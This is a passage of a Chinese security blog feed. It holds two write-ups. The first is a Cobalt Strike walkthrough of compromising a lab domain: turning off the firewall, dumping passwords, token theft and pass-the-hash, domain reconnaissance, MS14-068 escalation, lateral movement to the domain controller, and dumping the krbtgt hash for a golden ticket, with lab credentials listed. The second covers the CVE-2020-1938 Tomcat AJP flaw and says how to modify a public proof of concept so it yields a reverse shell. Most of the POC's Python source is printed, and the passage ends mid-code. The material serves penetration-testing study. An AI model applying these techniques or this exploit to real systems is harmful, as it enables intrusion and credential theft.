allprofiles state off</code> 关闭防火墙<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200323162821.png-water_print" alt=""></p><h3 id="内网的信息搜集"><a href="#内网的信息搜集" class="headerlink" title="内网的信息搜集"></a>内网的信息搜集</h3><p>(先在local admin操作,因为system权限看不到登录域)</p><h4 id="获取当前登录域"><a href="#获取当前登录域" class="headerlink" title="获取当前登录域"></a>获取当前登录域</h4><p>通过命令 <code>net config workstation</code> 获取登录域<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200323163025.png-water_print" alt=""></p><p>我们可以看到，工作站域是 <code>sun.com</code>可现在登录域是 <code>win7</code>。因此我们需要一个域用户的进程来进行信息搜集</p><p>在此之前先调用 Logonpasswords 抓一波密码(在 <code>local admin</code> 和 <code>local system</code> 上操作都可以)</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200323163627.png-water_print" alt=""></p><p>利用密码：</p><ul><li>第一种:使用 make_token 去调用 </li><li>第二种:使用 pth 命令生成一个新的进程注入进去 </li><li>第三种:使用 spawn as</li></ul><p>需要用这三种方法调用我们刚刚以及抓取的凭证以继续完全相应的信息收集操作</p><p>第一种：<code>Make_token Make_token</code> 是在当前的 beacon 上进行身份伪造</p><blockquote><p>在当前 beacon 上，您的权限、权限或标识没有变化。但是，当您与远程资源交互时，使用的是您伪造的身份。</p></blockquote><p>使用 <code>rev2self</code> 命令丢弃口令<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200323164151.png-water_print" alt=""></p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200323164230.png-water_print" alt=""></p><p>第二种: <code>PTH Pth</code> ( pth 会生成一个进程，生成过后我们需要 <code>steal_token</code>，<code>steal_token</code> 过后也是使用 <code>rev2self</code> 丢弃口令)</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200323164437.png-water_print" alt=""></p><p>使用命令 <code>steal_token 7912</code>：</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200323164529.png-water_print" alt=""></p><p>第三种：<code>Spawnas</code><br><code>spawnas</code> 命令生成具有其他用户凭据的 <code>beacon</code>:</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200323164802.png-water_print" alt=""></p><p>当然除此以可以用 <code>Processes inject</code> 去直接注入到某个用户的进程(这里的操作需要 <code>system</code> 权限，在 <code>local system</code> 进行操作)</p><h4 id="查看内网的主机-域主机"><a href="#查看内网的主机-域主机" class="headerlink" title="查看内网的主机/域主机"></a>查看内网的主机/域主机</h4><p>使用 <code>net view</code> 指令查看内网的主机(加域名即为查看域主机)<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200323174136.png-water_print" alt=""></p><h4 id="查看信任域"><a href="#查看信任域" class="headerlink" title="查看信任域"></a>查看信任域</h4><p>使用 <code>net domain_trusts</code> 查看信任域<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200323174326.png-water_print" alt=""></p><h4 id="查看域内计算机"><a href="#查看域内计算机" class="headerlink" title="查看域内计算机"></a>查看域内计算机</h4><p>使用 <code>net computers {域的dns名,这里是sun.com}</code> 查看域内计算机：</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200323174515.png-water_print" alt=""></p><h4 id="查看域控"><a href="#查看域控" class="headerlink" title="查看域控"></a>查看域控</h4><p>使用 <code>net dclist {域名称,这里是sun}</code> 查看域控:<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200323174624.png-water_print" alt=""></p><h4 id="查看域管理员"><a href="#查看域管理员" class="headerlink" title="查看域管理员"></a>查看域管理员</h4><p>使用 <code>net group \\{域控名,这里是DC} domain admins</code> 查看域管理员:<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200323174807.png-water_print" alt=""></p><h4 id="查看域和用户的-sid"><a href="#查看域和用户的-sid" class="headerlink" title="查看域和用户的 sid"></a>查看域和用户的 sid</h4><p><code>使用 whoami /all</code> 查看域和用户的sid:<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200323174956.png-water_print" alt=""></p><h4 id="信息汇总"><a href="#信息汇总" class="headerlink" title="信息汇总"></a>信息汇总</h4><pre><code>域名:sun.com域管理员:sun\administrator 域用户:administrator，admin，leo和一个krbtgt域控:DC域成员:DC，Win7域控ip:192.168.138.138 用户sid:S-1-5-21-3388020223-1982701712-4030140183-1110 域sid:S-1-5-21-3388020223-1982701712-4030140183已知凭据:sun\leo:123.comwin7\heart:123.com</code></pre><h2 id="域提权"><a href="#域提权" class="headerlink" title="域提权"></a>域提权</h2><p>利用 <code>ms14-068</code> 域提权<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200323175842.png-water_print" alt=""></p><p>导入伪造缓存:<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200323180100.png-water_print" alt=""></p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200323180147.png-water_print" alt=""></p><h2 id="横向到域控"><a href="#横向到域控" class="headerlink" title="横向到域控"></a>横向到域控</h2><p>(在 domain user 的 beacon 上操作)<br>这里创建一个 listener 作为横向演示，名字为 <code>Lateral Movement</code> ，我选择 <code>smb_beacon</code> 更好，<code>smb beacon</code> 能过防火墙，动静小<br>(在 cs4.0 中，有 jump 和 remote-exec 命令)</p><p>点击 <code>View-Target</code>:<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200323180522.png-water_print" alt=""></p><p>因为我们已经有权限访问DC了，直接勾选下面的使用当前口令即可:</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200323180653.png-water_print" alt=""></p><p>DC 成功上线：<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200323180810.png-water_print" alt=""></p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200323180942.png-water_print" alt=""></p><h2 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h2><h3 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h3><p>首先先利用 <code>logonpasswords</code> 抓一波明文(在名为DC的Beacon进行操作)<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200323181311.png-water_print" alt=""></p><p>使用 <code>dcsync</code> 命令导出 <code>krbtgt</code> 的 <code>NTLM Hash</code>，或者，使用 <code>hashdump</code> 也可以导出 hash</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200323181439.png-water_print" alt=""></p><p>为了方便于实践黄金票据，手动生成了一个新的域用户geekby:<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200323184757.png-water_print" alt=""></p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200323185108.png-water_print" alt=""></p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200323185125.png-water_print" alt=""></p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200323185136.png-water_print" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 内网 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2020-1938 Apache Tomcat AJP 文件包含漏洞</title>
      <link href="/2020/02/21/cve-2020-1938-apache-tomcat-ajp-wen-jian-bao-han-lou-dong/"/>
      <url>/2020/02/21/cve-2020-1938-apache-tomcat-ajp-wen-jian-bao-han-lou-dong/</url>
      
        <content type="html"><![CDATA[<h1 id="CVE-2020-1938-Apache-Tomcat-AJP-文件包含漏洞"><a href="#CVE-2020-1938-Apache-Tomcat-AJP-文件包含漏洞" class="headerlink" title="CVE-2020-1938 Apache Tomcat AJP 文件包含漏洞"></a>CVE-2020-1938 Apache Tomcat AJP 文件包含漏洞</h1><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>docker-compose.yml</p><pre class=" language-yaml"><code class="language-yaml"><span class="token key atrule">version</span><span class="token punctuation">:</span> <span class="token string">'2'</span><span class="token key atrule">services</span><span class="token punctuation">:</span> <span class="token key atrule">tomcat</span><span class="token punctuation">:</span>   <span class="token key atrule">image</span><span class="token punctuation">:</span> vulhub/tomcat<span class="token punctuation">:</span>9.0.30   <span class="token key atrule">ports</span><span class="token punctuation">:</span>    <span class="token punctuation">-</span> <span class="token string">"8080:8080"</span>    <span class="token punctuation">-</span> <span class="token string">"8009:8009"</span></code></pre><p>启动镜像：</p><pre class=" language-bash"><code class="language-bash">docker-compose up -d</code></pre><h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><p>来源：<a href="https://github.com/nibiwodong/CNVD-2020-10487-Tomcat-ajp-POC" target="_blank" rel="noopener">https://github.com/nibiwodong/CNVD-2020-10487-Tomcat-ajp-POC</a></p><p>原作者的 poc 只能读文件，将原作者 poc 的 <code>self.req_uri = req_uri</code> 改为 <code>self.req_uri = req_uri + ".jsp"</code> 即可文件包含，从而反弹 shell。</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token keyword">import</span> struct<span class="token comment" spellcheck="true"># Some references:</span><span class="token comment" spellcheck="true"># https://tomcat.apache.org/connectors-doc/ajp/ajpv13a.html</span><span class="token keyword">def</span> <span class="token function">pack_string</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> s <span class="token keyword">is</span> None<span class="token punctuation">:</span>        <span class="token keyword">return</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">">h"</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>    l <span class="token operator">=</span> len<span class="token punctuation">(</span>s<span class="token punctuation">)</span>    <span class="token keyword">return</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">">H%dsb"</span> <span class="token operator">%</span> l<span class="token punctuation">,</span> l<span class="token punctuation">,</span> s<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf8'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">unpack</span><span class="token punctuation">(</span>stream<span class="token punctuation">,</span> fmt<span class="token punctuation">)</span><span class="token punctuation">:</span>    size <span class="token operator">=</span> struct<span class="token punctuation">.</span>calcsize<span class="token punctuation">(</span>fmt<span class="token punctuation">)</span>    buf <span class="token operator">=</span> stream<span class="token punctuation">.</span>read<span class="token punctuation">(</span>size<span class="token punctuation">)</span>    <span class="token keyword">return</span> struct<span class="token punctuation">.</span>unpack<span class="token punctuation">(</span>fmt<span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">unpack_string</span><span class="token punctuation">(</span>stream<span class="token punctuation">)</span><span class="token punctuation">:</span>    size<span class="token punctuation">,</span> <span class="token operator">=</span> unpack<span class="token punctuation">(</span>stream<span class="token punctuation">,</span> <span class="token string">">h"</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> size <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true"># null string</span>        <span class="token keyword">return</span> None    res<span class="token punctuation">,</span> <span class="token operator">=</span> unpack<span class="token punctuation">(</span>stream<span class="token punctuation">,</span> <span class="token string">"%ds"</span> <span class="token operator">%</span> size<span class="token punctuation">)</span>    stream<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># \0</span>    <span class="token keyword">return</span> res<span class="token keyword">class</span> <span class="token class-name">NotFoundException</span><span class="token punctuation">(</span>Exception<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">pass</span><span class="token keyword">class</span> <span class="token class-name">AjpBodyRequest</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true"># server == web server, container == servlet</span>    SERVER_TO_CONTAINER<span class="token punctuation">,</span> CONTAINER_TO_SERVER <span class="token operator">=</span> range<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>    MAX_REQUEST_LENGTH <span class="token operator">=</span> <span class="token number">8186</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> data_stream<span class="token punctuation">,</span> data_len<span class="token punctuation">,</span> data_direction<span class="token operator">=</span>None<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>data_stream <span class="token operator">=</span> data_stream        self<span class="token punctuation">.</span>data_len <span class="token operator">=</span> data_len        self<span class="token punctuation">.</span>data_direction <span class="token operator">=</span> data_direction    <span class="token keyword">def</span> <span class="token function">serialize</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        data <span class="token operator">=</span> self<span class="token punctuation">.</span>data_stream<span class="token punctuation">.</span>read<span class="token punctuation">(</span>AjpBodyRequest<span class="token punctuation">.</span>MAX_REQUEST_LENGTH<span class="token punctuation">)</span>        <span class="token keyword">if</span> len<span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">">bbH"</span><span class="token punctuation">,</span> <span class="token number">0x12</span><span class="token punctuation">,</span> <span class="token number">0x34</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            res <span class="token operator">=</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">">H"</span><span class="token punctuation">,</span> len<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span>            res <span class="token operator">+=</span> data        <span class="token keyword">if</span> self<span class="token punctuation">.</span>data_direction <span class="token operator">==</span> AjpBodyRequest<span class="token punctuation">.</span>SERVER_TO_CONTAINER<span class="token punctuation">:</span>            header <span class="token operator">=</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">">bbH"</span><span class="token punctuation">,</span> <span class="token number">0x12</span><span class="token punctuation">,</span> <span class="token number">0x34</span><span class="token punctuation">,</span> len<span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            header <span class="token operator">=</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">">bbH"</span><span class="token punctuation">,</span> <span class="token number">0x41</span><span class="token punctuation">,</span> <span class="token number">0x42</span><span class="token punctuation">,</span> len<span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> header <span class="token operator">+</span> res    <span class="token keyword">def</span> <span class="token function">send_and_receive</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> socket<span class="token punctuation">,</span> stream<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>            data <span class="token operator">=</span> self<span class="token punctuation">.</span>serialize<span class="token punctuation">(</span><span class="token punctuation">)</span>            socket<span class="token punctuation">.</span>send<span class="token punctuation">(</span>data<span class="token punctuation">)</span>            r <span class="token operator">=</span> AjpResponse<span class="token punctuation">.</span>receive<span class="token punctuation">(</span>stream<span class="token punctuation">)</span>            <span class="token keyword">while</span> r<span class="token punctuation">.</span>prefix_code <span class="token operator">!=</span> AjpResponse<span class="token punctuation">.</span>GET_BODY_CHUNK <span class="token operator">and</span> r<span class="token punctuation">.</span>prefix_code <span class="token operator">!=</span> AjpResponse<span class="token punctuation">.</span>SEND_HEADERS<span class="token punctuation">:</span>                r <span class="token operator">=</span> AjpResponse<span class="token punctuation">.</span>receive<span class="token punctuation">(</span>stream<span class="token punctuation">)</span>            <span class="token keyword">if</span> r<span class="token punctuation">.</span>prefix_code <span class="token operator">==</span> AjpResponse<span class="token punctuation">.</span>SEND_HEADERS <span class="token operator">or</span> len<span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">4</span><span class="token punctuation">:</span>                <span class="token keyword">break</span><span class="token keyword">class</span> <span class="token class-name">AjpForwardRequest</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">:</span>    _<span class="token punctuation">,</span> OPTIONS<span class="token punctuation">,</span> GET<span class="token punctuation">,</span> HEAD<span class="token punctuation">,</span> POST<span class="token punctuation">,</span> PUT<span class="token punctuation">,</span> DELETE<span class="token punctuation">,</span> TRACE<span class="token punctuation">,</span> PROPFIND<span class="token punctuation">,</span> PROPPATCH<span class="token punctuation">,</span> MKCOL<span class="token punctuation">,</span> COPY<span class="token punctuation">,</span> MOVE<span class="token punctuation">,</span> LOCK<span class="token punctuation">,</span> UNLOCK<span class="token punctuation">,</span> ACL<span class="token punctuation">,</span> REPORT<span class="token punctuation">,</span> VERSION_CONTROL<span class="token punctuation">,</span> CHECKIN<span class="token punctuation">,</span> CHECKOUT<span class="token punctuation">,</span> UNCHECKOUT<span class="token punctuation">,</span> SEARCH<span class="token punctuation">,</span> MKWORKSPACE<span class="token punctuation">,</span> UPDATE<span class="token punctuation">,</span> LABEL<span class="token punctuation">,</span> MERGE<span class="token punctuation">,</span> BASELINE_CONTROL<span class="token punctuation">,</span> MKACTIVITY <span class="token operator">=</span> range<span class="token punctuation">(</span><span class="token number">28</span><span class="token punctuation">)</span>    REQUEST_METHODS <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'GET'</span><span class="token punctuation">:</span> GET<span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">:</span> POST<span class="token punctuation">,</span> <span class="token string">'HEAD'</span><span class="token punctuation">:</span> HEAD<span class="token punctuation">,</span> <span class="token string">'OPTIONS'</span><span class="token punctuation">:</span> OPTIONS<span class="token punctuation">,</span> <span class="token string">'PUT'</span><span class="token punctuation">:</span> PUT<span class="token punctuation">,</span> <span class="token string">'DELETE'</span><span class="token punctuation">:</span> DELETE<span class="token punctuation">,</span> <span class="token string">'TRACE'</span><span class="token punctuation">:</span> TRACE<span class="token punctuation">}</span>    <span class="token comment" spellcheck="true"># server == web server, container == servlet</span>    SERVER_TO_CONTAINER<span class="token punctuation">,</span> CONTAINER_TO_SERVER <span class="token operator">=</span> range<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>    COMMON_HEADERS <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"SC_REQ_ACCEPT"</span><span class="token punctuation">,</span>        <span class="token string">"SC_REQ_ACCEPT_CHARSET"</span><span class="token punctuation">,</span> <span class="token string">"SC_REQ_ACCEPT_ENCODING"</span><span class="token punctuation">,</span> <span class="token string">"SC_REQ_ACCEPT_LANGUAGE"</span><span class="token punctuation">,</span> <span class="token string">"SC_REQ_AUTHORIZATION"</span><span class="token punctuation">,</span>        <span class="token string">"SC_REQ_CONNECTION"</span><span class="token punctuation">,</span> <span class="token string">"SC_REQ_CONTENT_TYPE"</span><span class="token punctuation">,</span> <span class="token string">"SC_REQ_CONTENT_LENGTH"</span><span class="token punctuation">,</span> <span class="token string">"SC_REQ_COOKIE"</span><span class="token punctuation">,</span> <span class="token string">"SC_REQ_COOKIE2"</span><span class="token punctuation">,</span>        <span class="token string">"SC_REQ_HOST"</span><span class="token punctuation">,</span> <span class="token string">"SC_REQ_PRAGMA"</span><span class="token punctuation">,</span> <span class="token string">"SC_REQ_REFERER"</span><span class="token punctuation">,</span> <span class="token string">"SC_REQ_USER_AGENT"</span>    <span class="token punctuation">]</span>    ATTRIBUTES <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"context"</span><span class="token punctuation">,</span> <span class="token string">"servlet_path"</span><span class="token punctuation">,</span> <span class="token string">"remote_user"</span><span class="token punctuation">,</span> <span class="token string">"auth_type"</span><span class="token punctuation">,</span> <span class="token string">"query_string"</span><span class="token punctuation">,</span> <span class="token string">"route"</span><span class="token punctuation">,</span> <span class="token string">"ssl_cert"</span><span class="token punctuation">,</span> <span class="token string">"ssl_cipher"</span><span class="token punctuation">,</span> <span class="token string">"ssl_session"</span><span class="token punctuation">,</span> <span class="token string">"req_attribute"</span><span class="token punctuation">,</span> <span class="token string">"ssl_key_size"</span><span class="token punctuation">,</span> <span class="token string">"secret"</span><span class="token punctuation">,</span> <span class="token string">"stored_method"</span><span class="token punctuation">]</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> data_direction<span class="token operator">=</span>None<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>prefix_code <span class="token operator">=</span> <span class="token number">0x02</span>        self<span class="token punctuation">.</span>method <span class="token operator">=</span> None        self<span class="token punctuation">.</span>protocol <span class="token operator">=</span> None        self<span class="token punctuation">.</span>req_uri <span class="token operator">=</span> None        self<span class="token punctuation">.</span>remote_addr <span class="token operator">=</span> None        self<span class="token punctuation">.</span>remote_host <span class="token operator">=</span> None        self<span class="token punctuation">.</span>server_name <span class="token operator">=</span> None        self<span class="token punctuation">.</span>server_port <span class="token operator">=</span> None        self<span class="token punctuation">.</span>is_ssl <span class="token operator">=</span> None        self<span class="token punctuation">.</span>num_headers <span class="token operator">=</span> None        self<span class="token punctuation">.</span>request_headers <span class="token operator">=</span> None        self<span class="token punctuation">.</span>attributes <span class="token operator">=</span> None        self<span class="token punctuation">.</span>data_direction <span class="token operator">=</span> data_direction    <span class="token keyword">def</span> <span class="token function">pack_headers</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>num_headers <span class="token operator">=</span> len<span class="token punctuation">(</span>self<span class="token punctuation">.</span>request_headers<span class="token punctuation">)</span>        res <span class="token operator">=</span> <span class="token string">""</span>        res <span class="token operator">=</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">">h"</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>num_headers<span class="token punctuation">)</span>        <span class="token keyword">for</span> h_name <span class="token keyword">in</span> self<span class="token punctuation">.</span>request_headers<span class="token punctuation">:</span>            <span class="token keyword">if</span> h_name<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">"SC_REQ"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                code <span class="token operator">=</span> AjpForwardRequest<span class="token punctuation">.</span>COMMON_HEADERS<span class="token punctuation">.</span>index<span class="token punctuation">(</span>h_name<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span>                res <span class="token operator">+=</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">"BB"</span><span class="token punctuation">,</span> <span class="token number">0xA0</span><span class="token punctuation">,</span> code<span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                res <span class="token operator">+=</span> pack_string<span class="token punctuation">(</span>h_name<span class="token punctuation">)</span>            res <span class="token operator">+=</span> pack_string<span class="token punctuation">(</span>self<span class="token punctuation">.</span>request_headers<span class="token punctuation">[</span>h_name<span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> res    <span class="token keyword">def</span> <span class="token function">pack_attributes</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        res <span class="token operator">=</span> b<span class="token string">""</span>        <span class="token keyword">for</span> attr <span class="token keyword">in</span> self<span class="token punctuation">.</span>attributes<span class="token punctuation">:</span>            a_name <span class="token operator">=</span> attr<span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span>            code <span class="token operator">=</span> AjpForwardRequest<span class="token punctuation">.</span>ATTRIBUTES<span class="token punctuation">.</span>index<span class="token punctuation">(</span>a_name<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span>            res <span class="token operator">+=</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">"b"</span><span class="token punctuation">,</span> code<span class="token punctuation">)</span>            <span class="token keyword">if</span> a_name <span class="token operator">==</span> <span class="token string">"req_attribute"</span><span class="token punctuation">:</span>                aa_name<span class="token punctuation">,</span> a_value <span class="token operator">=</span> attr<span class="token punctuation">[</span><span class="token string">'value'</span><span class="token punctuation">]</span>                res <span class="token operator">+=</span> pack_string<span class="token punctuation">(</span>aa_name<span class="token punctuation">)</span>                res <span class="token operator">+=</span> pack_string<span class="token punctuation">(</span>a_value<span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                res <span class="token operator">+=</span> pack_string<span class="token punctuation">(</span>attr<span class="token punctuation">[</span><span class="token string">'value'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        res <span class="token operator">+=</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">"B"</span><span class="token punctuation">,</span> <span class="token number">0xFF</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> res    <span class="token keyword">def</span> <span class="token function">serialize</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        res <span class="token operator">=</span> <span class="token string">""</span>        res <span class="token operator">=</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">"bb"</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>prefix_code<span class="token punctuation">,</span> self<span class="token punctuation">.</span>method<span class="token punctuation">)</span>        res <span class="token operator">+=</span> pack_string<span class="token punctuation">(</span>self<span class="token punctuation">.</span>protocol<span class="token punctuation">)</span>        res <span class="token operator">+=</span> pack_string<span class="token punctuation">(</span>self<span class="token punctuation">.</span>req_uri<span class="token punctuation">)</span>        res <span class="token operator">+=</span> pack_string<span class="token punctuation">(</span>self<span class="token punctuation">.</span>remote_addr<span class="token punctuation">)</span>        res <span class="token operator">+=</span> pack_string<span class="token punctuation">(</span>self<span class="token punctuation">.</span>remote_host<span class="token punctuation">)</span>        res <span class="token operator">+=</span> pack_string<span class="token punctuation">(</span>self<span class="token punctuation">.</span>server_name<span class="token punctuation">)</span>        res <span class="token operator">+=</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">">h"</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>server_port<span class="token punctuation">)</span>        res <span class="token operator">+=</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">"?"</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>is_ssl<span class="token punctuation">)</span>        res <span class="token operator">+=</span> self<span class="token punctuation">.</span>pack_headers<span class="token punctuation">(</span><span class="token punctuation">)</span>        res <span class="token operator">+=</span> self<span class="token punctuation">.</span>pack_attributes<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> self<span class="token punctuation">.</span>data_direction <span class="token operator">==</span> AjpForwardRequest<span class="token punctuation">.</span>SERVER_TO_CONTAINER<span class="token punctuation">:</span>            header <span class="token operator">=</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">">bbh"</span><span class="token punctuation">,</span> <span class="token number">0x12</span><span class="token punctuation">,</span> <span class="token number">0x34</span><span class="token punctuation">,</span> len<span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            header <span class="token operator">=</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">">bbh"</span><span class="token punctuation">,</span> <span class="token number">0x41</span><span class="token punctuation">,</span> <span class="token number">0x42</span><span class="token punctuation">,</span> len<span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> header <span class="token operator">+</span> res    <span class="token keyword">def</span> <span class="token function">parse</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> raw_packet<span class="token punctuation">)</span><span class="token punctuation">:</span>        stream <span class="token operator">=</span> StringIO<span class="token punctuation">(</span>raw_packet<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>magic1<span class="token punctuation">,</span> self<span class="token punctuation">.</span>magic2<span class="token punctuation">,</span> data_len <span class="token operator">=</span> unpack<span class="token punctuation">(</span>stream<span class="token punctuation">,</span> <span class="token string">"bbH"</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>prefix_code<span class="token punctuation">,</span> self<span class="token punctuation">.</span>method <span class="token operator">=</span> unpack<span class="token punctuation">(</span>stream<span class="token punctuation">,</span> <span class="token string">"bb"</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>protocol <span class="token operator">=</span> unpack_string<span class="token punctuation">(</span>stream<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>req_uri <span class="token operator">=</span> unpack_string<span class="token punctuation">(</span>stream<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>remote_addr <span class="token operator">=</span> unpack_string<span class="token punctuation">(</span>stream<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>remote_host <span class="token operator">=</span> unpack_string<span class="token 